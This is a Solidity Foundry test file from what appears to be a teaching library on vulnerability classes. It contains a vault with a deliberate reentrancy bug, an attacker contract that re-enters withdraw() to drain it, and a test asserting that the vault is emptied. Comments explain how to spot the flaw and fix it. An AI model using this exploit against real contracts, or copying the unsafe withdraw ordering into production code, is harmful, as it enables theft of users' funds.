// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PoCTest, console} from "../base/PoCTest.sol";

/// @notice Classic single-function reentrancy. Self-contained (no fork) so it
///         runs with `forge test` out of the box and doubles as the first entry
///         in the teaching vuln library: VULN CLASS — Reentrancy.
///
/// Heuristic to spot it: an external call (`.call`/`.transfer`/ERC777 hook /
/// onERC721Received) happens BEFORE state is updated → CEI (Checks-Effects-
/// Interactions) is violated. Fix: update state first, or use a reentrancy guard.
contract VulnerableVault {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balanceOf[msg.sender];
        require(bal > 0, "no balance");
        // BUG: external call happens before state update (Interaction before Effect).
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "send failed");
        balanceOf[msg.sender] = 0; // too late — attacker already re-entered.
    }

    receive() external payable {}
}

contract Attacker {
    VulnerableVault public immutable vault;
    uint256 public constant UNIT = 1 ether;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function pwn() external payable {
        vault.deposit{value: UNIT}();
        vault.withdraw();
    }

    receive() external payable {
        // Re-enter while our recorded balance is still non-zero.
        if (address(vault).balance >= UNIT) {
            vault.withdraw();
        }
    }
}

contract ReentrancyTest is PoCTest {
    VulnerableVault vault;
    Attacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new Attacker(vault);
        // Seed the vault with other users' funds.
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
    }

    function test_drain() public {
        uint256 vaultBefore = address(vault).balance;
        console.log("vault before:", vaultBefore);
        assertEq(vaultBefore, 5 ether);

        vm.deal(address(attacker), 1 ether);
        attacker.pwn();

        console.log("vault after: ", address(vault).balance);
        console.log("attacker:    ", address(attacker).balance);
        // Attacker deposited 1, walked away with the whole 6.
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 6 ether);
    }
}
